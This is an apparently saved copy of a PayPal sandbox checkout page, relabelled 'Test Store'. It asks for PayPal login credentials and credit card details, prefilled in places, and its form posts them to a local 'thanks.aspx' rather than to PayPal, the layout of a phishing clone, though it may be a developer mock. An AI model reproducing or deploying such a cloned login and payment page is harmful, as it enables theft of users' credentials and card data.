<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- saved from url=(0248)https://www.sandbox.paypal.com/us/cgi-bin/webscr?cmd=_flow&SESSION=KRA-k0GDfhpWSGRsn_3IdVgpZBshxajCb-k6nZnDS_r7mU_rI54-6Kj24-e&dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b5eb2336391e7cbed125f6c5bdaf8a1cd475a5c32af8ad329 -->
<HTML>
<HEAD>
    <TITLE>Billing Information - PayPal</TITLE>
    <META http-equiv=Content-Type content="text/html; charset=UTF-8"><!--
         Script info: script: merchantpaymentweb, cmd: _flow, template: xpt/Merchant/hostedpayments/standard/Billing, date: Feb 23, 2010 06:14:18 PST; country: US, language: en_US, xslt server: 
       web version: 61.0-1208680 branch: UPR_610_007_int
       content version: -
       pexml version: 61.0-1208680
       page XSL: Merchant/default/en_US/hostedpayments/standard/Billing.xsl
       hostname : -pLpoXejfau2vs6jzF5JGxxHGfoGc3sdP9g2cFjXK5A
         rlogid : %2bpLpoXejfau2vs6jzF5JGwqQ3CvlQGoaETX%2bykux2c%2f9cfJqTxfCUGTwgemg7V5jX4b%2fu4%2fFSPk%3d_1270e95afd4-->
    <META http-equiv=description content="PayPal lets you send money to anyone with email. PayPal is free for consumers and works seamlessly with your existing credit card and checking account. You can settle debts, borrow cash, divide bills or split expenses with friends all without going to an ATM or looking for your checkbook.">
    <META http-equiv=keywords content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, cell phones, two-way pagers, Windows CE">
    <META http-equiv=X-UA-Compatible content=IE=8>
    <LINK media=screen href="payment/paypal_files/xptdev.css" type=text/css rel=stylesheet>
    <LINK href="payment/paypal_files/paypal.css" type=text/css rel=stylesheet>
    <LINK href="payment/paypal_files/flowWPS.css" type=text/css rel=stylesheet>
    <LINK href="payment/paypal_files/CreditCardEntry.css" type=text/css rel=stylesheet>
    <LINK href="payment/paypal_files/balloons.css" type=text/css rel=stylesheet>
    <LINK href="payment/paypal_files/sandbox.css" type=text/css rel=stylesheet>
    <SCRIPT src="payment/paypal_files/global.js" type=text/javascript></SCRIPT>
    <SCRIPT src="payment/paypal_files/bid.js" type=text/javascript></SCRIPT>
    <SCRIPT type=text/javascript>
        PAYPAL.common.loginflow = 'xpt/Merchant/hostedpayments/standard/Billing';
	    YAHOO.util.Event.addListener(window,"load",function(){
									try {
										PAYPAL.common.appendField("billing", "flow_name", PAYPAL.common.loginflow);
							PAYPAL.bp.init("billing","bp_mid");PAYPAL.ks.init("billing","login_password","bp_ks1");PAYPAL.ks.init("billing","password","bp_ks2");PAYPAL.ks.init("billing","retype_password","bp_ks3");
									} catch(err){ echo(err); }
								});
	</SCRIPT>
    <LINK href="https://www.sandbox.paypal.com/MERCHANTPAYMENTWEB-610-20100225-1/en_US/i/icon/pp_favicon_x.ico" rel="shortcut icon">
    <SCRIPT src="payment/paypal_files/iconix.js" type=text/javascript></SCRIPT>
    <SCRIPT src="payment/paypal_files/mid.js" type=text/javascript></SCRIPT>
    <SCRIPT type=text/javascript>PAYPAL.tns.loginflow = 'xpt/Merchant/hostedpayments/standard/Billing';PAYPAL.tns.flashLocation = 'https://www.sandbox.paypal.com/en_US/m/mid.swf';</SCRIPT>
    <META content="MSHTML 6.00.2900.2180" name=GENERATOR>
</HEAD>
<BODY class=xptSandbox id=billing onload=initialize();>
    <DIV id=header>
        <H1> Test Store</H1>
    </DIV>
    <HR>
    <DIV id=cowp-wrapper>
        <DIV id=main>
        <FORM id=billingform name=billing action="thanks.aspx" method=post>
            <INPUT id=CONTEXT_CGI_VAR type=hidden value=wtgSziM4C5x0SI-9CmKcv2vkSeTLK5P_g6HqzC__YTYkcqziFNcB84p79Ja name=CONTEXT>
            <INPUT id=myAllTextSubmitID type=hidden name=myAllTextSubmitID>
            <INPUT type=hidden value=_flow name=cmd>
            <INPUT type=hidden name=id>
            <INPUT type=hidden name=note><INPUT type=hidden value=false name=close_external_flow>
            <INPUT type=hidden value=payment_flow name=external_close_account_payment_flow>
            <INPUT id=dfltButton type=image src="payment/paypal_files/pixel.gif" value=Continue name=continue.x>
            <DIV id=shopping-cart>
                <DIV id=purchase-detail>
                    <INPUT id=item-quantity type=hidden value=1 name=item-quantity>
                        <DIV id=cover>
                            <TABLE id=cart cellSpacing=0 cellPadding=0 align=center border=0>
                                <THEAD>
                                    <TR>
                                        <TH class=item-name>Description</TH>
                                        <TH>&nbsp;</TH>
                                        <TH>Quantity</TH>
                                        <TH class=item-total width="8%">Amount</TH>
                                        <TH width="1%"></TH>
                                    </TR>
                                </THEAD>
                                <TBODY>
                                    <TR>
                                        <TD class=item-name>
                                            <DIV>Food
                                                <P class=item-option>Item #&nbsp;1</P>
                                            </DIV>
                                        </TD>
                                        <TD>&nbsp;</TD>
                                        <TD>1</TD>
                                        <TD class=item-total>$10.00</TD>
                                        <TD></TD>
                                    </TR>
                                </TBODY>
                                <TFOOT>
                                    <TR>
                                        <TD id=notes vAlign=bottom colSpan=2></TD>
                                        <TD vAlign=bottom>Item total:</TD>
                                        <TD vAlign=bottom>&nbsp;</TD>
                                        <TD></TD>
                                    </TR>
                                    <TR id=exp_tax></TR>
                                    <TR id=exp_shipping-and-handling></TR>
                                    <TR id=exp_total>
                                        <TD class=totals-label colSpan=3>Total:</TD>
                                        <TD class=totals-value id=total_value><STRONG>$10.00</STRONG></TD>
                                        <TD class=totals-currency>Rs</TD>
                                    </TR>
                                </TFOOT>
                            </TABLE>
                        </DIV>
                        <DIV id=purchase-summary>
                            <DIV id=purchase-many>
                                <P>Dotted T-Shirt</P>
                            </DIV>
                            <P class=summary-total>
                                <SPAN>Total:</SPAN>
                                <SPAN class=price-total>$10.00</SPAN>
                                <SPAN class=price-currency>USD</SPAN>
                                <DIV id=totals>
                                    <TABLE id=col_shipping-table style="WIDTH: 100%" cellSpacing=0 cellPadding=0 align=right border=0>
                                        <TBODY></TBODY>
                                    </TABLE>
                                </DIV>
                                <P></P>
                                <DIV class=clearBoth></DIV>
                        </DIV>
                        <DIV class=toggle>
                            <A id=expander title="Click to view purchase details" href="https://www.sandbox.paypal.com/us/cgi-bin/webscr?cmd=_flow&amp;SESSION=KRA-k0GDfhpWSGRsn_3IdVgpZBshxajCb-k6nZnDS_r7mU_rI54-6Kj24-e&amp;dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b5eb2336391e7cbed125f6c5bdaf8a1cd475a5c32af8ad329#">Click to view purchase details</A>
                        </DIV>
                    <SPAN id=titleExpanded>Click to close purchase details</SPAN>
                </DIV>
            </DIV>
<H1>
    <SPAN id=pgHdr>Pay with Credit Card or Log In</SPAN>
    <A onclick="PAYPAL.core.openWindow(event,{height:500, width: 450});" href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=xpt/Merchant/popup/WaxAboutPaypal-outside" target=_blank>
        <IMG alt="Payments By PayPal" src="payment/paypal_files/pp_secure_213wx37h.gif" border=0>
    </A>
</H1>
<DIV id=post-header>
    <A onclick="PAYPAL.core.openWindow(event, {width: 640, height: 500})" href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=xpt/Merchant/popup/WhatIsPayPal-outside" target=_blank>
        Learn more
    </A> about PayPal - the safer, easier way to pay.
    <DIV id=control>
        <H2>Already have a PayPal account?</H2>
        <DIV class=loginOffset>
            <DIV class=login>
            <FIELDSET><LEGEND>Login</LEGEND>
            <P class=instructions>Please log in</P>
                <INPUT type=hidden value=false name=email_recovery>
                <INPUT type=hidden value=false name=password_recovery>
                <DIV class="fieldRow login-email">
                    <LABEL for=login_email>Email:</LABEL>
                    <INPUT class=smallInputWidth id=login_email name=login_email>
                </DIV>
                <DIV class="fieldRow login-password">
                    <LABEL for=login_password>Password:</LABEL>
                    <INPUT class=smallInputWidth id=login_password type=password name=login_password autocomplete="off">
                </DIV>
                <DIV class=buttonRow>
                    <INPUT class="" id=login.x onClick="" type=submit value="Log In" name=login.x>
                </DIV>
                <DIV class=notes>
                <P class=note>Forgot
                    <A href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=_email-recovery">emailaddress</A> or
                    <A href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=_forgot-password" target=_blank>password</A>?
                </P>
                </DIV>
            </FIELDSET>
            </DIV>
        </DIV>
    </DIV>
</DIV>
<DIV id=content>
    <DIV>
    <H2>Enter your billing information</H2>
    <FIELDSET id=billing-entry><LEGEND>Create a PayPal Account</LEGEND>
    <FIELDSET class=standardfinancing id=ccdetails><LEGEND>Credit CardDetails</LEGEND>
        <INPUT id=creditCardEntry type=hidden name=creditCardEntry>
        <DIV class=fieldrow id=fieldrowCCNumber>
            <LABEL for=cc_number>Credit CardNumber:</LABEL>
            <INPUT id=cc_number onblur=getCC(this); onkeyup=getCC(this); maxLength=24 onchange=getCC(this); value=4890253926977125 name=cc_number>
        </DIV>
        <BR>
        <DIV class="fieldrow payment-type">
            <LABEL for=credit_card_type>PaymentType</LABEL>
            <FIELDSET class=payment-type id=payment-type title="Payment Type"><LEGEND>Select</LEGEND>
            <DIV>
                <INPUT class=hidden id=visa type=radio value=V name=credit_card_type>
            </DIV>
            <NOSCRIPT>
                <INPUT id=visa type="radio" CHECKED value=V name=credit_card_type></NOSCRIPT>
                <LABEL id=pm-visa title=Visa for=visa>Visa</LABEL>
<DIV>
    <INPUT class=hidden id=mastercard type=radio value=M name=credit_card_type>
</DIV><NOSCRIPT>
                    <INPUT id=mastercard type=radio value=M name=credit_card_type></NOSCRIPT>
                <LABEL id=pm-mastercard title=Mastercard for=mastercard>MasterCard</LABEL>
<DIV><INPUT class=hidden id=amex type=radio value=A 
name=credit_card_type></DIV><NOSCRIPT><INPUT id=amex type=radio value=A 
name=credit_card_type></NOSCRIPT> <LABEL id=pm-amex title="American Express" 
for=amex>American Express</LABEL>
<DIV><INPUT class=hidden id=discover type=radio value=D 
name=credit_card_type></DIV><NOSCRIPT><INPUT id=discover type=radio value=D 
name=credit_card_type></NOSCRIPT> <LABEL id=pm-discover title=Discover 
for=discover>Discover</LABEL> </FIELDSET> </DIV>
<DIV class="fieldrow exp-date" id=fieldrowCCExpDate><LABEL 
for=expdate>Expiration Date:</LABEL><INPUT id=expdate_month 
onkeyup="this.style.color = '#000';" onfocus=getCC(this);clearField(this); 
onclick=clearField(this); maxLength=2 value=mm name=expdate_month>/<INPUT 
id=expdate_year onKeyUp="this.style.color = '#000';" onfocus=clearField(this); 
onclick="clearField(this); this.style.color = '#000';" maxLength=2 value=2006 
name=expdate_year> </DIV>
<DIV class="fieldrow csc" id=fieldrowCSC><LABEL 
for=cvv2_number>CSC:</LABEL><INPUT id=cvv2_number maxLength=4 size=4 value=000 
name=cvv2_number><SPAN class=autoTooltip 
title="For MasterCard or Visa, it's the last three digits in the signature area on the back of your card.  For American Express, it's the four digits on the front of the card.">
<DL class=quick-faq id=csc-def>
  <DT><A id=csc-hover 
  onclick="PAYPAL.core.openWindow(event, {width: 425, height: 450});" 
  href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/acc/cvv_info_pop-outside" 
  target=_blank>What's this?</A></DT></DL></SPAN></DIV></FIELDSET>
<DIV id=afterform>
<DIV class=buttonrow><INPUT class="" id=review type=submit value="Review Order and Continue" name=continue.x><SPAN 
id=agree style="DISPLAY: none"><INPUT class="" type=submit value="Agree and Continue" name=continue.x></SPAN> 
</DIV></DIV><INPUT type=hidden value=UTF-8 name=form_charset> </FORM></DIV>
<DIV id=footerhps>
<P>PayPal. The safer, easier way to pay.</P>
<P>For more information, read our <A id=ua_link 
href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/gen/ua/ua-outside&amp;country.x=US" 
target=_blank>User Agreement</A> and <A id=privacy_policy_link 
href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/gen/ua/policy_privacy-outside&amp;country.x=US" 
target=_blank>Privacy Policy</A>.</P>
<SCRIPT type=text/javascript>document.getElementById("ua_link").onclick=function() {openWindow640('https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/gen/ua/ua_pop-outside&popup=1&country.x=US'); return false;};document.getElementById("privacy_policy_link").onclick=function() {openWindow640('https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/gen/ua/policy_privacy_pop-outside&popup=1&country.x=US'); return false;};</SCRIPT>

<SCRIPT src="payment/paypal_files/widgets.js" type=text/javascript></SCRIPT>

<SCRIPT src="payment/paypal_files/billing.js" type=text/javascript></SCRIPT>

<SCRIPT src="payment/paypal_files/hostedpayments.js" type=text/javascript></SCRIPT>

<SCRIPT src="payment/paypal_files/orderInfo.js" type=text/javascript></SCRIPT>

<SCRIPT src="payment/paypal_files/billingForm.js" type=text/javascript></SCRIPT>

<SCRIPT src="payment/paypal_files/creditCardEntry.js" type=text/javascript></SCRIPT>

<SCRIPT src="payment/paypal_files/pp_main.js" type=text/javascript></SCRIPT>

<SCRIPT src="payment/paypal_files/pageBlockingUnsafeBrowsers.js"
type=text/javascript></SCRIPT>

<SCRIPT src="payment/paypal_files/pp_naturalsearch.js" type=text/javascript></SCRIPT>

<SCRIPT type=text/javascript>mp_landing();</SCRIPT>

<DIV class="" id=ppwebapi></DIV><!-- SiteCatalyst Code
Copyright 1997-2005 Omniture, Inc.
More info available at http://www.omniture.com -->
<SCRIPT src="payment/paypal_files/pp_jscode_paypalsandboxdev.js"
type=text/javascript></SCRIPT>

<SCRIPT type=text/javascript>
<!--
/* SiteCatalyst Variables */
s.prop1="xpt/Merchant/hostedpayments/standard/Billing";
s.prop5="48Y345701B0993424";
s.prop7="Unknown";
s.prop8="Unknown";
s.prop9="Unknown";
s.prop10="US";
s.prop20="1267259999";
s.prop21="b6a3275a2bf16";
s.prop22="0";
s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
s.pageName="xpt/Merchant/hostedpayments/standard/Billing::_flow";
s.prop50="en_US";
s.prop18="";
/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
var s_code=s.t();if(s_code)document.write(s_code)//--></SCRIPT>

<SCRIPT type=text/javascript><!--
if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')

function first_name_onclick() {

}

//-->
</SCRIPT>
<NOSCRIPT><IMG height=1 alt="" src="" width=1 border=0></NOSCRIPT> <!--/DO NOT REMOVE/--><!-- End SiteCatalyst Code --></BODY></HTML>
